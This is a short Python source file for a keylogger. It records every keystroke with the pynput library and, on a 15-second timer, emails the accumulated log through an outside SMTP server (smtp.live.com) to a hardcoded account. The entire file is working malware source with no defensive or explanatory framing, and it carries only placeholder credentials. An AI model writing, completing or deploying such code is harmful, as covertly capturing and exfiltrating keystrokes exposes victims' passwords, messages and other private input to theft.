import pynput.keyboard
import smtplib
import threading

log = ""


def callbackFunction(key):
    global log
    try:
        log = log + str(key.char)
        # log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)


def sendEmail(email, password, message):
    emailServer = smtplib.SMTP("smtp.live.com", 25)
    emailServer.starttls()
    emailServer.login(email, password)
    emailServer.sendmail(email, email, message)
    emailServer.quit()


def threadFunction():
    global log
    sendEmail("user@hotmail.com", "password", log.encode("utf-8"))
    log = ""
    timerObject = threading.Timer(15, threadFunction)
    timerObject.start()


keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunction)

# Threading
with keyloggerListener:
    threadFunction()
    keyloggerListener.join()
